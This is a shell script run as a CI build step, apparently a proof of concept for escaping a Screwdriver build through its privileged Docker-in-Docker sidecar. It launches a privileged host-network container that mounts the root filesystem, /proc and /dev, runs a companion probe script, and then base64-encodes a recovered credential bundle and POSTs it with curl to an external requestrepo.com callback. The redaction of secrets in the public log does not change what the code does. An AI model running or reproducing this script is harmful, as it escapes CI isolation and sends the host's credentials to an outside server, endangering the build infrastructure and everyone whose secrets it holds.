#!/bin/sh
set -eu
MARKER="sd-k8s-host-rce-1789456873-e849ef8b"
CALLBACK="https://ug3svetg.requestrepo.com/${MARKER}"
SHARE="${SD_DIND_SHARE_PATH:-/opt/sd_dind_share}"
OUT="$SHARE/gatofox-live-rce"
mkdir -p "$OUT"

# Keep public build output useful but do not print recovered credential bodies.
printf 'LIVE_RCE_MARKER=%s\n' "$MARKER"
printf 'BUILD_UID=%s BUILD_GID=%s NODE_ID=%s BUILD_ID=%s PIPELINE_ID=%s\n' \
  "$(id -u)" "$(id -g)" "${NODE_ID:-unknown}" "${SD_BUILD_ID:-unknown}" "${SD_PIPELINE_ID:-unknown}"
uname -a | tee "$OUT/build-uname.txt"
id | tee "$OUT/build-id.txt"
env | sort | sed -E '/(TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)/Id' > "$OUT/build-environment-redacted.txt"

# Ensure the current build really received the live privileged DinD sidecar.
i=0
until docker info > "$OUT/docker-info.txt" 2> "$OUT/docker-info.err"; do
  i=$((i+1)); [ "$i" -ge 30 ] && { echo 'Docker sidecar unavailable'; cat "$OUT/docker-info.err"; exit 2; }
  sleep 2
done
echo 'DIND_API_REACHABLE=true'
docker version > "$OUT/docker-version.txt" 2>&1

cp ./nested-host-probe.sh "$SHARE/nested-host-probe.sh"
chmod 755 "$SHARE/nested-host-probe.sh"

# Docker bind source paths below are resolved by the DinD daemon, i.e. inside the
# privileged sidecar. The nested privileged container also inherits host devices.
docker run --rm --privileged --network host \
  -e MARKER="$MARKER" -e CALLBACK="$CALLBACK" -e NODE_ID="${NODE_ID:-unknown}" \
  -v "$SHARE:/share" \
  -v /:/dindroot:ro \
  -v /proc:/dindproc:ro \
  -v /dev:/hostdev \
  alpine:3.22 /share/nested-host-probe.sh | tee "$OUT/nested-public-summary.log"

# Independent final callback from the build container; the complete credential
# bundle is already POSTed by the nested container and is intentionally absent
# from the public Screwdriver step log.
if [ -f "$OUT/bundle.tgz" ]; then
  B64=$(base64 "$OUT/bundle.tgz" | tr -d '\n')
  printf '{"marker":"%s","phase":"build-container-final","node_id":"%s","build_id":"%s","bundle_b64":"%s"}\n' \
    "$MARKER" "${NODE_ID:-unknown}" "${SD_BUILD_ID:-unknown}" "$B64" > "$OUT/requestrepo-final.json"
  curl -ksS --max-time 30 -H 'Content-Type: application/json' --data-binary "@$OUT/requestrepo-final.json" "$CALLBACK/final" > "$OUT/requestrepo-final-response.txt"
  echo "REQUESTREPO_FINAL_POST=true bundle_sha256=$(sha256sum "$OUT/bundle.tgz" | awk '{print $1}')"
else
  echo 'REQUESTREPO_FINAL_POST=false'
fi
